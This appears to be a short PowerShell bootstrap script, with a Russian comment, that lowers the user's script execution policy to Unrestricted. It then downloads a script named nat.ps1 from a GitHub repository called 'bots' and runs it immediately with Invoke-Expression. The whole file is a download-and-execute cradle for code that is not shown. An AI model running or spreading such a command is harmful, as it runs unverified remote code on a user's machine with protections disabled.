[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#Разрешить запуск скриптов
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
$Script = Invoke-RestMethod https://raw.githubusercontent.com/zip609/bots/main/nat.ps1
Invoke-Expression $Script
